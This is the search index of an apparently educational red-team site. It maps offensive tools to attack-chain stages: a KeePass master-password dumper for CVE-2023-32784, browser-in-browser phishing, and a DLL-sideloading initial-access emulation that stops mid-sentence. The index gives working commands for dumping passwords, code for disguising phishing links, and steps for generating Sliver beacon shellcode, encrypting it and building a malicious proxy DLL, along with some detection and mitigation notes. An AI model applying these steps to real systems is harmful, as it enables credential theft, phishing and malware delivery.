{"config":{"indexing":"full","lang":["en"],"min_search_length":3,"prebuild_index":false,"separator":"[\\s\\-]+"},"docs":[{"location":"","text":"Expanding the Attack Chain Introduction This resource provides an assessment of new attack tools and provide insights and practical solutions to contemporary cyber-security challenges. The functionality and impact of each tool has been mapped to a corresponding stage of the attack chain. The approach was intended to enhance the understanding of how different tools can be utilized to infiltrate, exploit, and persist within a target environment. How defenders can detect and respond to such attacks has also been considered. It is designed to be deployed in line with attack steps outlined in the Mitre Att&ck chain. Evasion Capabilities The first aspect considered in the evaluation process was the ability of the tools to evade modern antivirus solutions. Each tool was tested against standard commercial and open-source antivirus products to determine their detection rates. Tools that exhibited a high evasion rate without compromising functionality were given priority. This focus ensures that red teams can simulate sophisticated attacks while providing blue teams with opportunities to improve their detection and response mechanisms. Traceability and Forensics The assessment also considered tool traceability. While some tools aimed to fly under the radar entirely, others were found to leave purposeful traces to be analyzed by blue teams during post-incident investigations. Traceability is useful because it offers an invaluable learning opportunity for both offensive and defensive teams. It affords an opportunity to understand the indicators of compromise (IOCs) left behind by various attacks. These insights contribute to improved forensic analysis and incident response capabilities. Documentation and Testing Extensive documentation played a crucial role in the evaluation process. Each tool was scrutinized based on the clarity and comprehensiveness of its documentation. This includes installation guides, usage instructions, and troubleshooting solutions. Careful documentation ensures that both red and blue teams can effectively understand and utilize the tools in their respective roles. Rigorous testing validated their effectiveness in various attack scenarios. Collaborative Learning The research task aimed to foster collaboration between red and blue teams with an emphasis on knowledge-sharing and mutual learning. By providing detailed documentation and evaluation results, the resource facilitates cross-team understanding. These insights empower both sides to leverage this research to improve their capabilities. A collaborative approach empowers defenders to stay one step ahead of emerging threats while enabling attackers to refine their tactics within an evolving landscape.","title":"Home"},{"location":"#expanding-the-attack-chain","text":"","title":"Expanding the Attack Chain"},{"location":"#introduction","text":"This resource provides an assessment of new attack tools and provide insights and practical solutions to contemporary cyber-security challenges. The functionality and impact of each tool has been mapped to a corresponding stage of the attack chain. The approach was intended to enhance the understanding of how different tools can be utilized to infiltrate, exploit, and persist within a target environment. How defenders can detect and respond to such attacks has also been considered. It is designed to be deployed in line with attack steps outlined in the Mitre Att&ck chain.","title":"Introduction"},{"location":"#evasion-capabilities","text":"The first aspect considered in the evaluation process was the ability of the tools to evade modern antivirus solutions. Each tool was tested against standard commercial and open-source antivirus products to determine their detection rates. Tools that exhibited a high evasion rate without compromising functionality were given priority. This focus ensures that red teams can simulate sophisticated attacks while providing blue teams with opportunities to improve their detection and response mechanisms.","title":"Evasion Capabilities"},{"location":"#traceability-and-forensics","text":"The assessment also considered tool traceability. While some tools aimed to fly under the radar entirely, others were found to leave purposeful traces to be analyzed by blue teams during post-incident investigations. Traceability is useful because it offers an invaluable learning opportunity for both offensive and defensive teams. It affords an opportunity to understand the indicators of compromise (IOCs) left behind by various attacks. These insights contribute to improved forensic analysis and incident response capabilities.","title":"Traceability and Forensics"},{"location":"#documentation-and-testing","text":"Extensive documentation played a crucial role in the evaluation process. Each tool was scrutinized based on the clarity and comprehensiveness of its documentation. This includes installation guides, usage instructions, and troubleshooting solutions. Careful documentation ensures that both red and blue teams can effectively understand and utilize the tools in their respective roles. Rigorous testing validated their effectiveness in various attack scenarios.","title":"Documentation and Testing"},{"location":"#collaborative-learning","text":"The research task aimed to foster collaboration between red and blue teams with an emphasis on knowledge-sharing and mutual learning. By providing detailed documentation and evaluation results, the resource facilitates cross-team understanding. These insights empower both sides to leverage this research to improve their capabilities. A collaborative approach empowers defenders to stay one step ahead of emerging threats while enabling attackers to refine their tactics within an evolving landscape.","title":"Collaborative Learning"},{"location":"1-preparation/phases/","text":"Attack Chain The attack path consists of the following steps: Attacker : Kali 1 (IP: x.x.x.x) Gains initial access to the network via a reverse tunnel from the Rogue Device (.20). The reverse tunnel allows the attacker to establish a connection from the Rogue Device to Kali 1, effectively bypassing network defenses and gaining a foothold within the target environment. Lateral Movement : Rogue Device (IP: 192.168.0.20) to WIN10-NEW (.103) Once inside the network, the red team pivots from the Rogue Device to the target machine WIN10-NEW. The lateral movement to WIN10-NEW (IP: 192.168.0.103) involves leveraging the compromised position of the Rogue Device to gain access to WIN10-NEW. Pivoting : WIN10-NEW (.103) to DC (.10) From WIN10-NEW, the red team pivots through the DC (Domain Controller) ma-chine (IP: 192.168.0.10). This pivot allows the red team to escalate privileges and establish control over the DC machine, which plays a crucial role in further stages of the attack chain. Target Machine : WIN11 The ultimate target machine, WIN11, is where the data to be stolen is located. This serves as the final objective within the attack chain. The attack is designed to proceed according to a systematic progression of steps and demonstrate potential routes an attacker can take within the target environment. The subsequent sections focus on the tools employed in each stage of the attack chain.","title":"Attack Chain"},{"location":"1-preparation/phases/#attack-chain","text":"The attack path consists of the following steps: Attacker : Kali 1 (IP: x.x.x.x) Gains initial access to the network via a reverse tunnel from the Rogue Device (.20). The reverse tunnel allows the attacker to establish a connection from the Rogue Device to Kali 1, effectively bypassing network defenses and gaining a foothold within the target environment. Lateral Movement : Rogue Device (IP: 192.168.0.20) to WIN10-NEW (.103) Once inside the network, the red team pivots from the Rogue Device to the target machine WIN10-NEW. The lateral movement to WIN10-NEW (IP: 192.168.0.103) involves leveraging the compromised position of the Rogue Device to gain access to WIN10-NEW. Pivoting : WIN10-NEW (.103) to DC (.10) From WIN10-NEW, the red team pivots through the DC (Domain Controller) ma-chine (IP: 192.168.0.10). This pivot allows the red team to escalate privileges and establish control over the DC machine, which plays a crucial role in further stages of the attack chain. Target Machine : WIN11 The ultimate target machine, WIN11, is where the data to be stolen is located. This serves as the final objective within the attack chain. The attack is designed to proceed according to a systematic progression of steps and demonstrate potential routes an attacker can take within the target environment. The subsequent sections focus on the tools employed in each stage of the attack chain.","title":"Attack Chain"},{"location":"2-recon/hak5/hak5/","text":"Shark Jack Background Shark Jack is a portable network attack and automation tool. It can be deployed against a target network for rapid reconnaissance, exfiltration and IT automation tasks. There are 3 modes: off, arming and attack. Modes can be selected by toggling a switch located on the side of the device. Arming In arming mode, Shark Jack is configured with a static IP address of 172.16.24.1 . This allows a connection to be established with the device using SSH or HTTP protocols. Once connected, you have the ability to upload new payloads or review the results of previously executed payloads. The outcomes of payloads are automatically saved to the /root/loot/ directory for easy access and analysis. Attack In attack mode Shark Jack executes the payload.sh or payload.txt bash script located in the /root/payload directory. Pre-made scripts can be accessed from a dedicated GitHub repository . Shark Jack utilizes an LED to indicate the device's status. During attack mode, LED behavior is controlled by the currently executing payload. Typically when the LED is blinking it signifies an action is being carried out. Once the LED turns off it indicates the payload has finished executing and the device can be safely disconnected.","title":"Shark Jack"},{"location":"2-recon/hak5/hak5/#shark-jack","text":"","title":"Shark Jack"},{"location":"2-recon/hak5/hak5/#background","text":"Shark Jack is a portable network attack and automation tool. It can be deployed against a target network for rapid reconnaissance, exfiltration and IT automation tasks. There are 3 modes: off, arming and attack. Modes can be selected by toggling a switch located on the side of the device.","title":"Background"},{"location":"2-recon/hak5/hak5/#arming","text":"In arming mode, Shark Jack is configured with a static IP address of 172.16.24.1 . This allows a connection to be established with the device using SSH or HTTP protocols. Once connected, you have the ability to upload new payloads or review the results of previously executed payloads. The outcomes of payloads are automatically saved to the /root/loot/ directory for easy access and analysis.","title":"Arming"},{"location":"2-recon/hak5/hak5/#attack","text":"In attack mode Shark Jack executes the payload.sh or payload.txt bash script located in the /root/payload directory. Pre-made scripts can be accessed from a dedicated GitHub repository . Shark Jack utilizes an LED to indicate the device's status. During attack mode, LED behavior is controlled by the currently executing payload. Typically when the LED is blinking it signifies an action is being carried out. Once the LED turns off it indicates the payload has finished executing and the device can be safely disconnected.","title":"Attack"},{"location":"3-resource-development/keepass-password-dumper/keepass/","text":"KeePass Password Dumper Works against KeePass versions: <= 2.53.1 Exploit code repository: https://github.com/CMEPW/keepass-dump-masterkey Background KeePass Password Dumper leverages vulnerability CVE-2023-32784 to obtain a fragment of the KeePass database master password. The tool works by reading a memory dump file containing a KeePass process dump. One of the following memory dump types can be utilized: KeePass process dump Swap file (Linux) pagefile.sys (Windows) hiberfile.sys (Windows, hibernation file) RAM dump of the entire system The tool's success rate is very good. The tool typically recovers everything but the first character. For the second character the tool yields an array which contains the correct second character. The first character needs to be brute-forced. The second character should be fuzzed with the array containing the correct character. Practical exploitation requirements The KeePass version should be <= 2.53.1 Before executing the memory dump, the (victim) user has to have a database active in KeePass processes The (victim) user has to type the password to open the database with a master key (pasting from the clipboard will not work) Cracking the DB password Acquire a memory dump containing the data of the whole KeePass process. Run python script to analyze the dump file python3 poc.py <PATH_TO_DUMP> example python3 poc.py KeePass.exe.2.52.dmp Analysing the output The figure below shows the output of poc.py after it analyzed dump of KeePass version 2.52. First character of the master password remained undiscovered. In this case program provided 11 different possibilities for the 2nd letter of the password.","title":"Keepass Password Dumper"},{"location":"3-resource-development/keepass-password-dumper/keepass/#keepass-password-dumper","text":"Works against KeePass versions: <= 2.53.1 Exploit code repository: https://github.com/CMEPW/keepass-dump-masterkey","title":"KeePass Password Dumper"},{"location":"3-resource-development/keepass-password-dumper/keepass/#background","text":"KeePass Password Dumper leverages vulnerability CVE-2023-32784 to obtain a fragment of the KeePass database master password. The tool works by reading a memory dump file containing a KeePass process dump. One of the following memory dump types can be utilized: KeePass process dump Swap file (Linux) pagefile.sys (Windows) hiberfile.sys (Windows, hibernation file) RAM dump of the entire system The tool's success rate is very good. The tool typically recovers everything but the first character. For the second character the tool yields an array which contains the correct second character. The first character needs to be brute-forced. The second character should be fuzzed with the array containing the correct character.","title":"Background"},{"location":"3-resource-development/keepass-password-dumper/keepass/#practical-exploitation-requirements","text":"The KeePass version should be <= 2.53.1 Before executing the memory dump, the (victim) user has to have a database active in KeePass processes The (victim) user has to type the password to open the database with a master key (pasting from the clipboard will not work)","title":"Practical exploitation requirements"},{"location":"3-resource-development/keepass-password-dumper/keepass/#cracking-the-db-password","text":"Acquire a memory dump containing the data of the whole KeePass process. Run python script to analyze the dump file python3 poc.py <PATH_TO_DUMP> example python3 poc.py KeePass.exe.2.52.dmp","title":"Cracking the DB password"},{"location":"3-resource-development/keepass-password-dumper/keepass/#analysing-the-output","text":"The figure below shows the output of poc.py after it analyzed dump of KeePass version 2.52. First character of the master password remained undiscovered. In this case program provided 11 different possibilities for the 2nd letter of the password.","title":"Analysing the output"},{"location":"3-resource-development/keepass-password-dumper/keepass-dumper/","text":"KeePass 2.X Master Password Dumper ( CVE-2023-32784 ) Update The vulnerability was assigned CVE-2023-32784 . It should be fixed in KeePass 2.54, which should come out in the beginning of June 2023 . Thanks again to Dominik Reichl for his fast response and creative fix! Clarification: the password has to be typed on a keyboard, not copied from a clipboard (see the How it works sections). What can you do First, update to KeePass 2.54 or higher once available. Second, if you've been using KeePass for a long time, your master password (and potentially other passwords) could be in your pagefile/swapfile, hibernation file and crash dump(s). Depending on your paranoia level, you can consider these steps to resolve the issue: Change your master password Delete crash dumps (depends on your OS, on Windows at least C:\\Windows\\memory.dmp , but maybe there are others) Delete hibernation file Delete pagefile/swapfile (can be quite annoying, don't forget to enable it back again) Overwrite deleted data on the HDD to prevent carving (e.g. Cipher with /w on Windows) Restart your computer Or just overwrite your HDD and do a fresh install of your OS. Incomplete list of products that are not impacted (please create a pull request or an issue for adding more). Rule of thumb is that if it isn't the original KeePass 2.X app written in .NET, it's likely not affected. KeePassXC Strongbox KeePass 1.X ---- KeePass Master Password Dumper is a simple proof-of-concept tool used to dump the master password from KeePass's memory. Apart from the first password character, it is mostly able to recover the password in plaintext. No code execution on the target system is required, just a memory dump. It doesn't matter where the memory comes from - can be the process dump, swap file ( pagefile.sys ), hibernation file ( hiberfil.sys ), various crash dumps or RAM dump of the entire system. It doesn't matter whether or not the workspace is locked . It is also possible to dump the password from RAM after KeePass is no longer running, although the chance of that working goes down with the time it's been since then. Tested with KeePass 2.53.1 on Windows (English) and KeePass 2.47 on Debian (keepass2 package). It should work for the macOS version as well. Unfortunately, enabling the Enter master key on secure desktop option doesn't help in preventing the attack. PoC might have issues with databases created by older versions of KeePass, but I wasn't able to reproduce it (see issue #4 ). Finding was confirmed by Dominik Reichl, KeePass's author, here . I appreciate Dominik's fast response. Hopefully it will be fixed soon! Setup Install .NET (most major operating systems supported). Clone the repository: git clone https://github.com/vdohney/keepass-password-dumper or download it from GitHub Enter the project directory in your terminal (Powershell on Windows) cd keepass-password-dumper dotnet run PATH_TO_DUMP The easiest way to test this on Windows is to create a process dump in the task manager by right-clicking the KeePass process and selecting \"Create dump file\". Alternatively you can add another parameter dotnet run PATH_TO_DUMP PATH_TO_PWDLIST to generate a list of all possible passwords beginning from the second character. Should You Be Worried? Depends on your threat model. If your computer is already infected by malware that's running in the background with the privileges of your user, this finding doesn't make your situation much worse. However, it might be easier for the malware to be stealthy and evade the antivirus, since unlike KeeTheft or KeeFarce, no process injection or other type of code execution is necessary. If you have a reasonable suspicion that someone could obtain access to your computer and conduct forensic analysis, this could be bad. Worst case scenario is that the master password will be recovered, despite KeePass being locked or not running at all. If you use full disk encryption with a strong password and your system is clean, you should be fine. No one can steal your passwords remotely over the internet with this finding alone. How It Works KeePass 2.X uses a custom-developed text box for password entry, SecureTextBoxEx . This text box is not only used for the master password entry, but in other places in KeePass as well, like password edit boxes (so the attack can also be used to recover their contents). The flaw exploited here is that for every character typed, a leftover string is created in memory. Because of how .NET works, it is nearly impossible to get rid of it once it gets created. For example, when \"Password\" is typed, it will result in these leftover strings: \u2022a, \u2022\u2022s, \u2022\u2022\u2022s, \u2022\u2022\u2022\u2022w, \u2022\u2022\u2022\u2022\u2022o, \u2022\u2022\u2022\u2022\u2022\u2022r, \u2022\u2022\u2022\u2022\u2022\u2022\u2022d. The POC application searches the dump for these patterns and offers a likely password character for each position in the password. Reliability of this attack can be influenced depending on how the password was typed and how many passwords were typed per session. However, I've discovered that even if there are multiple passwords per session or typos, the way .NET CLR allocates these strings means that they are likely to be nicely ordered in memory. So if three different passwords were typed, you are likely to get three candidates for each character position in that order, which makes it possible to recover all three passwords. Dev It's a quick POC, so likely not very reliable and robust. Please create a pull request if you happen to find an issue and fix it. Allowed password characters are currently hardcoded like this: ^[\\x20-\\x7E]+$ (all printable ASCII characters and space). Acknowledgements Thanks to adridlug for adding the possibility to auto-generate the password list, and ynuwenhof for refactoring the code. Related Projects Python implementation of the PoC by CMEPW Rust implementation of the PoC by ynuwenhof I haven't checked any of them yet.","title":"KeePass 2.X Master Password Dumper ([CVE-2023-32784](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32784))"},{"location":"3-resource-development/keepass-password-dumper/keepass-dumper/#keepass-2x-master-password-dumper-cve-2023-32784","text":"","title":"KeePass 2.X Master Password Dumper (CVE-2023-32784)"},{"location":"3-resource-development/keepass-password-dumper/keepass-dumper/#update","text":"The vulnerability was assigned CVE-2023-32784 . It should be fixed in KeePass 2.54, which should come out in the beginning of June 2023 . Thanks again to Dominik Reichl for his fast response and creative fix! Clarification: the password has to be typed on a keyboard, not copied from a clipboard (see the How it works sections).","title":"Update"},{"location":"3-resource-development/keepass-password-dumper/keepass-dumper/#what-can-you-do","text":"First, update to KeePass 2.54 or higher once available. Second, if you've been using KeePass for a long time, your master password (and potentially other passwords) could be in your pagefile/swapfile, hibernation file and crash dump(s). Depending on your paranoia level, you can consider these steps to resolve the issue: Change your master password Delete crash dumps (depends on your OS, on Windows at least C:\\Windows\\memory.dmp , but maybe there are others) Delete hibernation file Delete pagefile/swapfile (can be quite annoying, don't forget to enable it back again) Overwrite deleted data on the HDD to prevent carving (e.g. Cipher with /w on Windows) Restart your computer Or just overwrite your HDD and do a fresh install of your OS. Incomplete list of products that are not impacted (please create a pull request or an issue for adding more). Rule of thumb is that if it isn't the original KeePass 2.X app written in .NET, it's likely not affected. KeePassXC Strongbox KeePass 1.X","title":"What can you do"},{"location":"3-resource-development/keepass-password-dumper/keepass-dumper/#-","text":"KeePass Master Password Dumper is a simple proof-of-concept tool used to dump the master password from KeePass's memory. Apart from the first password character, it is mostly able to recover the password in plaintext. No code execution on the target system is required, just a memory dump. It doesn't matter where the memory comes from - can be the process dump, swap file ( pagefile.sys ), hibernation file ( hiberfil.sys ), various crash dumps or RAM dump of the entire system. It doesn't matter whether or not the workspace is locked . It is also possible to dump the password from RAM after KeePass is no longer running, although the chance of that working goes down with the time it's been since then. Tested with KeePass 2.53.1 on Windows (English) and KeePass 2.47 on Debian (keepass2 package). It should work for the macOS version as well. Unfortunately, enabling the Enter master key on secure desktop option doesn't help in preventing the attack. PoC might have issues with databases created by older versions of KeePass, but I wasn't able to reproduce it (see issue #4 ). Finding was confirmed by Dominik Reichl, KeePass's author, here . I appreciate Dominik's fast response. Hopefully it will be fixed soon!","title":"----"},{"location":"3-resource-development/keepass-password-dumper/keepass-dumper/#setup","text":"Install .NET (most major operating systems supported). Clone the repository: git clone https://github.com/vdohney/keepass-password-dumper or download it from GitHub Enter the project directory in your terminal (Powershell on Windows) cd keepass-password-dumper dotnet run PATH_TO_DUMP The easiest way to test this on Windows is to create a process dump in the task manager by right-clicking the KeePass process and selecting \"Create dump file\". Alternatively you can add another parameter dotnet run PATH_TO_DUMP PATH_TO_PWDLIST to generate a list of all possible passwords beginning from the second character.","title":"Setup"},{"location":"3-resource-development/keepass-password-dumper/keepass-dumper/#should-you-be-worried","text":"Depends on your threat model. If your computer is already infected by malware that's running in the background with the privileges of your user, this finding doesn't make your situation much worse. However, it might be easier for the malware to be stealthy and evade the antivirus, since unlike KeeTheft or KeeFarce, no process injection or other type of code execution is necessary. If you have a reasonable suspicion that someone could obtain access to your computer and conduct forensic analysis, this could be bad. Worst case scenario is that the master password will be recovered, despite KeePass being locked or not running at all. If you use full disk encryption with a strong password and your system is clean, you should be fine. No one can steal your passwords remotely over the internet with this finding alone.","title":"Should You Be Worried?"},{"location":"3-resource-development/keepass-password-dumper/keepass-dumper/#how-it-works","text":"KeePass 2.X uses a custom-developed text box for password entry, SecureTextBoxEx . This text box is not only used for the master password entry, but in other places in KeePass as well, like password edit boxes (so the attack can also be used to recover their contents). The flaw exploited here is that for every character typed, a leftover string is created in memory. Because of how .NET works, it is nearly impossible to get rid of it once it gets created. For example, when \"Password\" is typed, it will result in these leftover strings: \u2022a, \u2022\u2022s, \u2022\u2022\u2022s, \u2022\u2022\u2022\u2022w, \u2022\u2022\u2022\u2022\u2022o, \u2022\u2022\u2022\u2022\u2022\u2022r, \u2022\u2022\u2022\u2022\u2022\u2022\u2022d. The POC application searches the dump for these patterns and offers a likely password character for each position in the password. Reliability of this attack can be influenced depending on how the password was typed and how many passwords were typed per session. However, I've discovered that even if there are multiple passwords per session or typos, the way .NET CLR allocates these strings means that they are likely to be nicely ordered in memory. So if three different passwords were typed, you are likely to get three candidates for each character position in that order, which makes it possible to recover all three passwords.","title":"How It Works"},{"location":"3-resource-development/keepass-password-dumper/keepass-dumper/#dev","text":"It's a quick POC, so likely not very reliable and robust. Please create a pull request if you happen to find an issue and fix it. Allowed password characters are currently hardcoded like this: ^[\\x20-\\x7E]+$ (all printable ASCII characters and space).","title":"Dev"},{"location":"3-resource-development/keepass-password-dumper/keepass-dumper/#acknowledgements","text":"Thanks to adridlug for adding the possibility to auto-generate the password list, and ynuwenhof for refactoring the code.","title":"Acknowledgements"},{"location":"3-resource-development/keepass-password-dumper/keepass-dumper/#related-projects","text":"Python implementation of the PoC by CMEPW Rust implementation of the PoC by ynuwenhof I haven't checked any of them yet.","title":"Related Projects"},{"location":"4-initial-access/phishing/bitb/bitb/","text":"Browser-in-browser attack Background Chromium application mode Chromium based browsers (such as Chrome and Edge) support the --app commandline flag. This will launch a website in application mode which does several things: Launched window is given a desktop application appearance rather than a browser appearance. Launches the website while hiding the address bar. Windows taskbar displays the website's favicon rather than the browser's. Causes the site to be launched in a seperate browser window. Commands to launch Chrome and Edge in application mode and open JYVSECTEC website: # Microsoft Edge \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --app=https://jyvsectec.fi # Chrome \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --app=https://jyvsectec.fi The above commands create the window shown below: We can see the Windows task bar displaying the site's favicon as the icon. Inserting a fake address bar Because the application mode hides the address bar, we can create a site with a fake address bar with some basic HTML/CSS: This is a local copy of the site edited with the fake URL bar. Pop-up login window When authenticating to websites like Microsoft, Google etc. we're given a pop-up window that asks us to authenticate. The image below shows the window that appears when someone tries to login to Figma with their Google account: Impersonating the pop-up login window Impersonating a pop-up login window is easy with some basic HTML/CSS knowledge. We can use an iframe to point to a malicious server hosting the phishing page and the results are telling: Demo Impersonating endpoint software With this technique, VPN, backup, Microsoft Office login software or pretty much anything can be impersonated if you have basic HTML/CSS skills. Here's an example of an impersonation of the Microsoft login when logging into Office 365: (This example can be found in this repository. It's a forked version of JoniRinta-Kahila's spoofed MS login page ). Another example is from Mr. D0x , where the Microsoft teams software login prompt is impersonated: The difference between real and fake phishing prompts can be very subtle and most likely will not cause alarm. Demo Linux & MacOS Chromium's application mode works on other operating systems the same way as per Chromium's documentation . Useful tricks with JavaScript The phishing site can control certain aspects of the window when launched. window.close() - Closes the window. Can be used to terminate the window after user performs an action. window.moveTo(x,y) - Positions the window. Use this to place the window to a certain area of the screen. window.resizeTo(x,y) - Resizes the window. Use this to resize the window to match the software being impersonated. Determining the legitimacy of a URL when hovering over a link is not effective if JavaScript is enabled. The href -tag can be pointed to a legitimate site. This can be overridden with a simple onclick() -event: <a href=\"https://jyvsectec.fi\" onclick=\"return launchWindow();\">JYVSECTEC</a> function launchWindow(){ // Launch the your fake authentication window return false; // This will make sure the href attribute is ignored } Detection Dragging the window One way of detecting a BitB attack is by dragging the window to the edge of the browser. If the window cannot escape the browser then it's not a real window. Browser extension @odacavo released a browser extension that can detect and warn users about embedded iFrames. It's available here .","title":"Browser-in-Browser"},{"location":"4-initial-access/phishing/bitb/bitb/#browser-in-browser-attack","text":"","title":"Browser-in-browser attack"},{"location":"4-initial-access/phishing/bitb/bitb/#background","text":"","title":"Background"},{"location":"4-initial-access/phishing/bitb/bitb/#chromium-application-mode","text":"Chromium based browsers (such as Chrome and Edge) support the --app commandline flag. This will launch a website in application mode which does several things: Launched window is given a desktop application appearance rather than a browser appearance. Launches the website while hiding the address bar. Windows taskbar displays the website's favicon rather than the browser's. Causes the site to be launched in a seperate browser window. Commands to launch Chrome and Edge in application mode and open JYVSECTEC website: # Microsoft Edge \"C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe\" --app=https://jyvsectec.fi # Chrome \"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe\" --app=https://jyvsectec.fi The above commands create the window shown below: We can see the Windows task bar displaying the site's favicon as the icon.","title":"Chromium application mode"},{"location":"4-initial-access/phishing/bitb/bitb/#inserting-a-fake-address-bar","text":"Because the application mode hides the address bar, we can create a site with a fake address bar with some basic HTML/CSS: This is a local copy of the site edited with the fake URL bar.","title":"Inserting a fake address bar"},{"location":"4-initial-access/phishing/bitb/bitb/#pop-up-login-window","text":"When authenticating to websites like Microsoft, Google etc. we're given a pop-up window that asks us to authenticate. The image below shows the window that appears when someone tries to login to Figma with their Google account:","title":"Pop-up login window"},{"location":"4-initial-access/phishing/bitb/bitb/#impersonating-the-pop-up-login-window","text":"Impersonating a pop-up login window is easy with some basic HTML/CSS knowledge. We can use an iframe to point to a malicious server hosting the phishing page and the results are telling:","title":"Impersonating the pop-up login window"},{"location":"4-initial-access/phishing/bitb/bitb/#demo","text":"","title":"Demo"},{"location":"4-initial-access/phishing/bitb/bitb/#impersonating-endpoint-software","text":"With this technique, VPN, backup, Microsoft Office login software or pretty much anything can be impersonated if you have basic HTML/CSS skills. Here's an example of an impersonation of the Microsoft login when logging into Office 365: (This example can be found in this repository. It's a forked version of JoniRinta-Kahila's spoofed MS login page ). Another example is from Mr. D0x , where the Microsoft teams software login prompt is impersonated: The difference between real and fake phishing prompts can be very subtle and most likely will not cause alarm.","title":"Impersonating endpoint software"},{"location":"4-initial-access/phishing/bitb/bitb/#demo_1","text":"","title":"Demo"},{"location":"4-initial-access/phishing/bitb/bitb/#linux-macos","text":"Chromium's application mode works on other operating systems the same way as per Chromium's documentation .","title":"Linux &amp; MacOS"},{"location":"4-initial-access/phishing/bitb/bitb/#useful-tricks-with-javascript","text":"The phishing site can control certain aspects of the window when launched. window.close() - Closes the window. Can be used to terminate the window after user performs an action. window.moveTo(x,y) - Positions the window. Use this to place the window to a certain area of the screen. window.resizeTo(x,y) - Resizes the window. Use this to resize the window to match the software being impersonated. Determining the legitimacy of a URL when hovering over a link is not effective if JavaScript is enabled. The href -tag can be pointed to a legitimate site. This can be overridden with a simple onclick() -event: <a href=\"https://jyvsectec.fi\" onclick=\"return launchWindow();\">JYVSECTEC</a> function launchWindow(){ // Launch the your fake authentication window return false; // This will make sure the href attribute is ignored }","title":"Useful tricks with JavaScript"},{"location":"4-initial-access/phishing/bitb/bitb/#detection","text":"","title":"Detection"},{"location":"4-initial-access/phishing/bitb/bitb/#dragging-the-window","text":"One way of detecting a BitB attack is by dragging the window to the edge of the browser. If the window cannot escape the browser then it's not a real window.","title":"Dragging the window"},{"location":"4-initial-access/phishing/bitb/bitb/#browser-extension","text":"@odacavo released a browser extension that can detect and warn users about embedded iFrames. It's available here .","title":"Browser extension"},{"location":"4-initial-access/phishing/dll-hijack/dll-hijack/","text":"Initial access by using DLL sideloading and abusing signed binaries This post showcases an attempt to emulate the initial access payload demonstrated in PaloAltoNetworks Unit42's blog post . The payload encompasses an ISO file containing on-disk shellcode, DLL sideloading payloads, and an LNK file to initiate the DLL sideloading process. Certain modifications have been made to certain steps, notably the packaging method for the ISO payload, which has been addressed by Microsoft's patches. The original payload Based on the Unit42 blog post, the attackers used an ISO payload with DLL sideloading, a LNK file and on-disk shellcode. The below diagram shows the attack flow: Image from PaloAlto Unit42 blog post. The initial payload starts as an ISO file. This was done most likely to bypass Mark-of-the-Web security feature. The following elements are inside the ISO file after it's mounted: TYPE NAME DESCRIPTION ISO Roshan_CV.iso ISO file that gets mounted and extracts payloads LNK Roshan-Bandara-CV-Dialog.lnk Windows shortcut file which starts OneDriveUpdater.exe through cmd.exe EXE OneDriverUpdater.exe A legitimate digitally signed Microsoft PE binary that is used to update OneDrive DLL version.dll Malicious proxy DLL that gets DLL sideloaded DLL vresion.dll Legitimate version.dll that is digitally signed by Microsoft Shellcode OneDrive.Update Shellcode that gets executed by version.dll The payload gets executed through the following steps: The ISO file extracts all the payloads listed in the table above. Victim user clicks the LNK file. The LNK file starts cmd.exe which then starts the OneDriveUpdater.exe. OneDriveUpdater.exe sideloads the attacker's version.dll. version.dll reads the shellcode (OneDrive.Update) from disk, decrypts it using XOR, and injects the shellcode into theRuntimeBroker.exe process. Any legitimate function calls to the version.dll gets proxied to the legitimate version.dll library -vresion.dll Based on the details above, let's recreate the payloads. Emulating the initial access with no money and no skills 1 - Shellcode The attackers used shellcode from Brute Ratel's C4 agent. This can be substituted with anything such as CobaltStrike or Meterpreter. In this case a Sliver beacon is generated: sliver > generate beacon --mtls <IP> -f shellcode --save /tmp/OneDrive.update The shellcode has to be XOR encrypted. The attackers used a 28-byte key jikoewarfkmzsdlhfnuiwaejrpaw to encrypt the shellcode. In this repository there's a simple XOR encryption tool XOR-tool.py written in Python3 that can do that. Change the parameters and and run the tool inside the directory the shellcode resides. 2 - OneDriveStandaloneUpdater and finding a sideloadable DLL You can obtain OneDriveStandaloneUpdater binary if you have the OneDrive installed on a machine at C:\\Users\\<user>\\AppData\\Local\\Microsoft\\OneDrive . Alternatively, you can download it through malshare by the IoC hashes that was listed in the Unit42's blog post. After you've got the binary, place it in a your working directory. The attackers used version.dll for their sideloading target. If you wish to use it, find it in c:\\windows\\system32 and copy it in the same working directory. Alternatively, you can find your own sideloading target with a tool like Spartacus or by running the binary with Procmon running in the background with the following filters: The results show potential DLL sideloading targets: In this case, this post will show how to sideload dpapi.dll , which the OneDriveStandaloneUpdater binary tries to load. Copy the DLL into your working directory. 3 - DLL Sideloading To create the malicious proxy DLL, you can use tool such as SharpDllProxy . To use it, clone the repository and compile it. Copy over the shellcode file and the dpapi.dll file in the directory where SharpDLLProxy is. Then, run it. cp c:\\windows\\system32\\dpapi.dll . .\\SharpDllProxy.exe --dll .\\dpapi.dll --payload .\\OneDrive.Update SharpDLLProxy will create a DLL and a .c file. The DLL is just a renamed dpapi.dll- rename the file to dapi.dll. Renaming the DLL is not necessary, this just mimics the filenames from the blog post. The .c file serves as the source code that will be compiled to generate the malicious DLL file. It is necessary to make alterations to this source code in order to align with the tactics, techniques, and procedures (TTPs) employed by the attackers. 4 - Modifying the proxy DLL The dpapi_pragma.c file is the file that needs to be compiled into the malicious proxy DLL - dpapi.dll. Open up Visual Studio (or any IDE) and create a Dynamic-Link Library (DLL) C++ project. The source code needs modifications to mimic the TTPs of the attackers. In the blog post, the attackers perform remote process injection using NtMapViewOfSection Windows API to map a memory section for the decrypted payload which gets reflected into Runtimebroker.exe memory space. In this post, we will execute the shellcode inline within the OneDriveStandaloneUpdater.exe without the need for remote process injection. The source code for the dpapi.dll is in this repository. If using Visual Studio, make sure the Project Charset is correctly set. Right click the project -> Properties -> Advanced -> Character Set -> Set to Use Multi-byte Character Set for the correct Configuration & Platform. 5 - LNK file The LNK file is used to execute OneDriveStandaloneUpdater.exe with cmd.exe . On Windows this can be done easily by right clicking inside our working directory and clicking New -> Shortcut. Right click the shortcut and click Properties. Edit the target section to run cmd.exe to execute OneDriveStandaloneUpdater.exe binary with the line: %windir%/system32/cmd.exe /c OneDriveStandaloneUpdater.exe Change the name and the icon of the LNK file as you see fit. 6 - 7zip packing In the original payload, the attackers used ISO format to pack their payload. This was most likely done to bypass Mark-of-the-Web (MotW) security feature. Microsoft has patched the ISO packing method in their November 2022 Patch security updates . In this 